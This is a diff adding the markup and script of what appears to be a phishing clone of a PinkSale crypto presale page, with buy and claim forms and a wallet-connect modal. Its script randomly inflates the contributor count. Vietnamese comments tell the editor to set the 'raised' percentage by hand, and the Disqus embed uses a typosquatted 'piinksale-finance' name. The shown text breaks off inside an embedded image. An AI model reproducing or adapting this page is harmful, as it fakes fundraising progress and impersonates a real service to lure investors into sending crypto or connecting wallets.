+                                            if (RealCapYesNo == 'XANHDAM') {
+                                                let gt = parseFloat(parseFloat(RealCap) + parseFloat(width / value));
+                                                if (gt == MaxRealCap) {
+                                                    jQuery("#MyValue").text(gt);
+                                                } else {
+                                                    jQuery("#MyValue").text(gt.toFixed(2));
+                                                }
+
+                                                if (ClaimStatus == "NO") {
+                                                    let TotalContributors = jQuery("#TotalContributors").text();
+
+                                                    if (TotalContributors > 1000) {
+                                                    } else {
+                                                        let random = Math.floor(Math.random() * (10 - 1 + 1) + 1);
+                                                        TotalContributors = parseInt(TotalContributors) + random;
+                                                        jQuery("#TotalContributors").text(TotalContributors);
+                                                    }
+                                                }
+
+                                            } else if (RealCapYesNo == 'NO') {
+                                                let gt = parseFloat(parseFloat(RealCap) + parseFloat(width / value));
+                                                if (gt == MaxRealCap) {
+                                                    jQuery("#MyValue").text(gt);
+                                                } else {
+                                                    jQuery("#MyValue").text(gt.toFixed(2));
+                                                }
+                                                elem.style.width = (gt) / MaxRealCap * 100 + '%';
+
+                                                if (ClaimStatus == "NO") {
+                                                    let TotalContributors = jQuery("#TotalContributors").text();
+                                                    if (TotalContributors > 1000) {
+                                                    } else {
+                                                        let random = Math.floor(Math.random() * (10 - 1 + 1) + 1);
+                                                        TotalContributors = parseInt(TotalContributors) + random;
+                                                        jQuery("#TotalContributors").text(TotalContributors);
+                                                    }
+                                                }
+                                            } else {
+                                                let gt = parseFloat(parseFloat(RealCap) + parseFloat(width / value));
+                                                if (gt == MaxRealCap) {
+                                                    jQuery("#MyValue").text(gt);
+                                                } else {
+                                                    jQuery("#MyValue").text(gt.toFixed(2));
+                                                }
+
+                                                if (ClaimStatus == "NO") {
+                                                    let TotalContributors = jQuery("#TotalContributors").text();
+                                                    if (TotalContributors > 1000) {
+                                                    } else {
+                                                        let random = Math.floor(Math.random() * (10 - 1 + 1) + 1);
+                                                        TotalContributors = parseInt(TotalContributors) + random;
+                                                        jQuery("#TotalContributors").text(TotalContributors);
+                                                    }
+                                                }
+                                            }
+                                        }, (index + 1) * 2000);
+                                    });
+                                }
+                                window.onload = move;
+
+                            </script>
+                            <div class="column is-flex-grow-1">
+                                <div class="ant-card ant-card-bordered" style="position: relative; border-color: rgb(255, 221, 87);">
+                                    <div class="ant-card-body">
+                                        <div style="position: absolute; left: 50%; top: 2px; transform: translate(-50%, -50%);">
+                                            <div class="AffiliateBadge_root___-kW1">
+                                                <div class="AffiliateBadge_line__1HBlV">
+                                                    <span>5%</span>
+                                                    <span>AFFILIATE</span>
+                                                </div>
+												
+                                            </div>
+                                        </div>
+                                        <div data-show="true" class="ant-alert ant-alert-warning ant-alert-no-icon" role="alert" style="margin-bottom: 10px;">
+                                            <div class="ant-alert-content">
+                                                <div class="ant-alert-message">Make sure the website is
+                                                    pinksale.finance!</div>
+                                                <div class="ant-alert-description"></div>
+                                            </div>
+                                        </div>
+                                        <form id="form_sale_live" style="display: block">
+                                            <div class="has-text-centered">
+                                                <p class="mb-2">Presale End In</p>
+                                                <div class="has-text-centered">
+                                                    <strong>
+                                                        <span class="p-2 has-background-danger-light mr-2" id="days" style="border-radius: 4px;">00</span>
+                                                        <span class="p-2 has-background-danger-light mr-2" id="hours" style="border-radius: 4px;">12</span>
+                                                        <span class="p-2 has-background-danger-light mr-2" id="phut" style="border-radius: 4px;">00</span>
+                                                        <span class="p-2 has-background-danger-light mr-2" id="second" style="border-radius: 4px;">00</span>
+                                                    </strong>
+                                                </div>
+                                            </div>
+                                            <div class="pb-4">
+                                                <div class="ant-progress ant-progress-line ant-progress-default mt-4 mb-2">
+                                                    <div class="ant-progress-outer">
+                                                        <div class="ant-progress-inner">
+                                                            <div class="ant-progress-bg" style="width: 00%;height: 15px;background: rgba(72, 199, 116, 0.5)">
+                                                            </div>
+                                                            <!-- Sửa phần trăm theo cái này, cho thuộc tính width là bao nhiêu phần trăm-->
+                                                            <div class="ant-progress-success-bg" id="" style="width:94%;height: 15px;background-color: rgb(72, 199, 116);">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="is-flex is-align-items-center is-size-7">
+                                                    <!-- Sửa cái đầu này -->
+                                                    <div class="is-flex-grow-1" style="font-weight: 600"><span id="MyValue">761 SOL ($114.2K)</span>
+                                                        <span id="minMyvalue"></span>
+                                                    </div>
+                                                    <div class="is-flex-grow-1 has-text-right" style="font-weight: 600" id="maxMyValue">10 SOL ($1.5K)
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="field">
+                                                <label class="label" id="amountbuy">Amount</label>
+                                                <div class="control">
+                                                    <div style="position: relative;">
+                                                        <input id="presaleAmount" class="input" type="number" placeholder="0.0" value="">
+                                                        <a id="btnMAX" class="mr-2 text-[#f95192]" style="position: absolute; right: 8px; top: 4px;" target="_blank" rel="noreferrer nofollow">
+                                                            <b>MAX</b>
+                                                        </a>
+                                                    </div>
+                                                    <p id="tokensam" class="help is-info"></p>
+                                                </div>
+                                                <div class="text-xs" style="display:none;margin-top: 8px;color: rgb(50, 152, 220);font-size: .75rem;line-height: 1rem;">
+                                                    You will receive: </div>
+                                            </div>
+                                            <button type="button" id="btnbuy" class="ant-btn ant-btn-primary bg-[#f95192] flex justify-center items-center" disabled="">
+                                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                                    <path d="M912 190h-69.9c-9.8 0-19.1 4.5-25.1 12.2L404.7 724.5 207 474a32 32 0 0 0-25.1-12.2H112c-6.7 0-10.4 7.7-6.3 12.9l273.9 347c12.8 16.2 37.4 16.2 50.3 0l488.4-618.9c4.1-5.1.4-12.8-6.3-12.8z">
+                                                    </path>
+                                                </svg>
+                                                <span class="ml-2" id="buywith">Buy with ETH</span>
+                                            </button>
+
+
+                                        </form>
+                                        <form id="form_claim" style="display: none">
+                                            <div class="pb-4">
+                                                <div class="ant-progress ant-progress-line ant-progress-default mt-4 mb-2">
+                                                    <div class="ant-progress-outer">
+                                                        <div class="ant-progress-inner">
+                                                            <div class="ant-progress-bg" style="width: 100%;height: 15px;background: rgba(72, 199, 116, 0.5)">
+                                                            </div>
+                                                            <!-- Sửa phần trăm theo cái này, cho thuộc tính width là bao nhiêu phần trăm-->
+                                                            <div class="ant-progress-success-bg" id="myBarKK" style="width: 100%; height: 15px; background-color: rgb(72, 199, 116);">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="is-flex is-align-items-center is-size-7">
+                                                    <!-- Sửa cái đầu này -->
+                                                    <div class="is-flex-grow-1" style="font-weight: 600"><span id="MyValueClaim">2 ETH ($5.4K)</span>
+                                                        <span id="minMyvalue"></span>
+                                                    </div>
+                                                    <div class="is-flex-grow-1 has-text-right" style="font-weight: 600" id="maxMyValue">2 ETH ($5.4K)
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="field flex justify-center">
+                                                <p>This pool has ended</p>
+                                            </div>
+                                            <button type="button" id="btn_claim" class="ant-btn ant-btn-primary bg-[#f95192] w-full flex justify-center items-center">
+                                                <span class="ml-2" id="btn_claim_with">Claim (55,881,366 PFT)</span>
+                                            </button>
+                                        </form>
+
+                                    </div>
+                                </div>
+                                <div style="height: 24px;"></div>
+                                <div class="ant-card ant-card-bordered mb-5">
+                                    <div class="ant-card-body">
+                                        <div class="table-container">
+                                            <table>
+                                                <tbody>
+                                                    <tr>
+                                                        <td>Status</td>
+                                                        <td class="has-text-right has-text-primary">Success</td>
+                                                    </tr>
+													<tr>
+                                                        <td>Sale Type</td>
+                                                        <td class="has-text-right has-text-primary">Public</td>
+                                                    </tr>
+                                                    <tr>
+													<td>Min Buy</td>
+                                                        <td class="has-text-right" id="CurrentRate">0.02 ETH</td>
+                                                    </tr>
+                                                        <td>Max Buy</td>
+                                                        <td class="has-text-right" id="CurrentRate">2 ETH</td>
+                                                    </tr>
+                                                    <!-- <tr>
+                                                        <td>Sale type</td>
+                                                        <td class="has-text-right has-text-primary">Public</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>Minimum Buy</td>
+                                                        <td class="has-text-right" id="minbuy">0.1 BNB
+                                                        </td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>Maximum Buy</td>
+                                                        <td class="has-text-right" id="maxbuy">5 BNB
+                                                        </td>
+                                                    </tr> -->
+                                                    <tr>
+                                                        <td>Current Raised</td>
+                                                        <td class="has-text-right" id="MaxContribution">2 ETH (100.00%)</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>Total Contributors</td>
+                                                        <td class="has-text-right" id="TotalContributors">8</td>
+                                                    </tr>
+                                                  
+                                                </tbody>
+                                            </table>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="ant-card ant-card-bordered mb-5 rounded">
+                                    <div class="ant-card-head">
+                                        <div class="ant-card-head-wrapper">
+                                            <div class="ant-card-head-title">Newsletters</div>
+                                            <div class="ant-card-extra">
+                                                <div class="text-sm style_radioButton__1dwz-"><label class="ant-radio-wrapper"><span class="ant-radio"><input type="radio" class="ant-radio-input" value=""><span class="ant-radio-inner"></span></span></label>Never show
+                                                    again</div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="ant-card-body">
+                                        <div class="text-sm mb-4">Sign up our mailing list to receive our new presales,
+                                            features, tips and reviews for next 100x projects.</div>
+                                        <div class="text-sm mb-4"><input placeholder="Enter your email address" class="ant-input" type="text" value=""></div>
+                                        <div><button type="button" class="ant-btn ant-btn-default" disabled="">
+                                                <div class="text-sm flex items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg" style="margin-bottom: -3px; margin-right: 4px;">
+                                                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z">
+                                                        </path>
+                                                        <polyline points="22,6 12,13 2,6"></polyline>
+                                                    </svg>
+                                                    <div class="text-sm">Subscribe</div>
+                                                </div>
+                                            </button></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="columns">
+                            <div class="column is-flex-grow-2">
+                                <div class="LockRecord_root__31Eay">
+                                    <div class="ant-card ant-card-bordered">
+                                        <div class="ant-card-body">
+
+                                            <div id="disqus_thread"><iframe id="dsq-app825" name="dsq-app825" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="saved_resource.html" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 614px !important;" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
+                                            <script>
+                                                (function () { // DON'T EDIT BELOW THIS LINE
+                                                    var d = document, s = d.createElement('script');
+                                                    s.src = 'https://piinksale-finance.disqus.com/embed.js';
+                                                    s.setAttribute('data-timestamp', +new Date());
+                                                    (d.head || d.body).appendChild(s);
+                                                })();
+                                            </script>
+                                            <noscript>Please enable JavaScript to view the <a
+                                                    href="https://disqus.com/?ref_noscript">comments powered by
+                                                    Disqus.</a></noscript>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="column is-flex-grow-1"></div>
+                        </div>
+                    </div>
+                </main>
+                <footer class="ant-layout-footer">
+                    <div class="container">
+                        <div class="copyright">
+                            <p class="has-text-centered">Disclaimer: The information provided shall not in any way
+                                constitute a recommendation as to whether you should invest in any product discussed. We
+                                accept no liability for any loss occasioned to any person acting or refraining from
+                                action as a result of any material provided or published.</p>
+                        </div>
+                    </div>
+                </footer>
+            </section>
+        </section>
+    </div>
+    <div>
+        <div class="ant-modal-root" id="btnconnectwallet">
+            <div tabindex="-1" class="ant-modal-wrap" role="dialog" aria-labelledby="rcDialogTitle0" style="display: none;">
+                <div role="document" class="ant-modal" style="width: 520px; transform-origin: 348px -73px">
+                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                    <div class="ant-modal-content">
+                        <button type="button" aria-label="Close" class="ant-modal-close">
+                            <span class="ant-modal-close-x" style="display: table-cell;text-align: center;vertical-align: middle;">
+                                <span role="img" aria-label="close" class="anticon anticon-close ant-modal-close-icon">
+                                    <svg viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em" height="1em" fill="currentColor" aria-hidden="true">
+                                        <path d="M563.8 512l262.5-312.9c4.4-5.2.7-13.1-6.1-13.1h-79.8c-4.7 0-9.2 2.1-12.3 5.7L511.6 449.8 295.1 191.7c-3-3.6-7.5-5.7-12.3-5.7H203c-6.8 0-10.5 7.9-6.1 13.1L459.4 512 196.9 824.9A7.95 7.95 0 00203 838h79.8c4.7 0 9.2-2.1 12.3-5.7l216.5-258.1 216.5 258.1c3 3.6 7.5 5.7 12.3 5.7h79.8c6.8 0 10.5-7.9 6.1-13.1L563.8 512z">
+                                        </path>
+                                    </svg>
+                                </span>
+                            </span>
+                        </button>
+                        <div class="ant-modal-header">
+                            <div class="ant-modal-title" id="rcDialogTitle0">Connect to a wallet</div>
+                        </div>
+                        <div class="ant-modal-body">
+                            <div class="ConnectWalletModal_items__3Ylt1">
+                                <div class="ant-spin-nested-loading">
+                                    <div class="ant-spin-container">
+                                        <div class="ProviderItem_item__2uvZt" id="linkmetamask">
+                                            <img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4=" alt="" class="ProviderItem_icon__2lS2v">
+                                            <div class="ProviderItem_title__3NYon">Install Metamask</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="ant-spin-nested-loading">
+                                    <div class="ant-spin-container">
+                                        <div class="ProviderItem_item__2uvZt" id="linkmetamask">
+                                            <img src="images/htFuAJyL6RBH.svg" alt="" class="ProviderItem_icon__2lS2v">
+                                            <div class="ProviderItem_title__3NYon">TrustWallet</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="ant-spin-nested-loading">
+                                    <div class="ant-spin-container">
+                                        <div class="ProviderItem_item__2uvZt" id="linkmetamask">
+                                            <img src="images/Q2ZefIwRQcNZ.svg" alt="" class="ProviderItem_icon__2lS2v">
+                                            <div class="ProviderItem_title__3NYon">WalletConnect</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="ant-spin-nested-loading">
+                                    <div class="ant-spin-container">
+                                        <div class="ProviderItem_item__2uvZt" id="linkmetamask">
+                                            <img src="images/4QzjLQMFGRpK.png" alt="" class="ProviderItem_icon__2lS2v">
+                                            <div class="ProviderItem_title__3NYon">Coinbase Wallet</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="ant-spin-nested-loading">
+                                    <div class="ant-spin-container">
+                                        <div class="ProviderItem_item__2uvZt" id="linkmetamask">
+                                            <img src="images/IEBR17WAxkXa.jpg" alt="" class="ProviderItem_icon__2lS2v">
+                                            <div class="ProviderItem_title__3NYon">SafePal Wallet</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="ant-spin-nested-loading">
+                                    <div class="ant-spin-container">
+                                        <div class="ProviderItem_item__2uvZt" id="linkmetamask">
+                                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAIQUExURUxpcQCm8gCm8gCm8gBa3gCm8gBa3gCm8gCm8wCm8gBa3gBa3QCn8wBa3gBa3gBa3gBb3gBa3QCn8wBa3gBa3QBa3gBo4gBa3gBa3gBa3QBb3gBa3gBa3QBa3gBa3QBa3QCn8wCl8gCn8wBa3gBa3QBa3gBa3gCm8gBa3QBa3gBa3gBa3gBb3gBa3gBa3QBa3gBa3gBa3gBa3gBa3gBa3QBb3gCn8wBa3gBa3QBa3gCl8gBZ3gBb3gBa3ABa3gBa3QBa3QBa3QBb3gBa3QBa3QBa3gBz5ABa3QBa3QBa3QBa3gBa3gBa3gBa3QBa3gCm8gBa3QCm8gCm8gBa3gBa3QBa3QBb3gCm8gBb3gBa3gBa3QBa3QBa3gBa3QBa3Quh8ACm8gCm8gCm8gCn8gCm8gCn8gCm8gCm8gBb3gCm8gBa3QBa3QBa3gCm8gCn8gCl8gBb3gBa3gBa3QCm8gCm8hGp8gBV3ABO2wOq8wdw4wBU3BSl8ABT2w+09Adq4gmt8wBa3QBa3QCm8gBa3gBb3gBa3ACn8gBb3QCl8gCn8wCm8wet8xGh7wBV3ABV2wBb3ABW3BGi7weu8xGi8ABZ3Qyx9BGh8Aes8wBT2wBV3Qau9AuP7ABW3QuQ7ABU3BCg7wBb3wBZ3Ayy9ASo8wCl8wuP6wBT2gBc3gas8wet9AuW7gJ/6A+29Q2W7BCi7wau8+4odCsAAACBdFJOUwDcCK2l4CemGGJb5Kb6+eSl/Nz0YeAByi1q7qmldFi6YqbgFTIX1+P9t7ogS0NWvZgbC4848XMe4/fhLxK6GV7R6YcJr8IGboONPEDOocSE7N9oKgp3nasEZZMP59skPHz2nxRdVP2wZ4awEVwTThpQTsabc2n8V3Oj3ObgEyferPQFEasAABqcSURBVHja7Fpbjx1HEc6DLWEQ0lreYAc7FopjK1YugGOEQhAkzo2QPJgIIsL1mbvgkav6VPX0zOzVNgrCspQ8IMET/EW6vq+qZ3afmLMSC9LprHbn3JyuqarvUn0ee2yzNmuzNmuzNmuzNmuzNmuzNmuzNmuzNmuzNmuz/t/Xl+9c3rpy5cyZK1tbV+oF1pnpzxb+nDmzxef4cAt/Ln/h7TtPbr/zo+u3/hfi+P7NrJoE/yXRlPA7i+SElbPmVJ+oP0kkac6pJCn2Qn3VPnrhldffvnr7Z6cdyNOv2nbVdlU3XIoFhSv7bSHYrkWKWHzF3lpDzFnsDVrjYEDy6m++9+uvnmogLz9u+6ibsttuV5lRqWjdvWVJtOasbjeLBYKslPpyfbrlEPfiwg9fvP3d0wvk0uM1ANsmdmM7j435zWaOSrbdW6Fx75aLkpE9+6xFWP87//mfXzu9QOrmxbZUy6Vu0qoGReWhIaJkTWNZSqgq+4CiFsVrstZfZhtdfOJrpxeIcN92l62TxapLsfHaCZaO1AoIWfO0WXlZcdXeQc0xVnn3iVunEwhaxKuqZO4MVSVsmeRvsKxYSqzFkcL6g7LTTLBrObz43GdOpdlZ9A5egra3igcAZ2ydf2vKooUK6ww58PLzYBUxvv/F/3ogf/ytEmC91mtYbJJcuDNyDJOmKCWxUiLPeN5YbRZzsVar/+KNT554Z7/41ScWrD/8+Pd/TsRZS4ZDMKikJkIZgPLuIyIkzYIsKc3gN9tbc6SsXp+/8+aJwnjzJ9/6ytm2njp+8dTRp8+e/dPvzu+h7pM0SkAEFZ1K1IthcEaRRc2hn9RrUqgMrNgc4ZCrm8+eJJBfrrC6la8Bj7qhPTk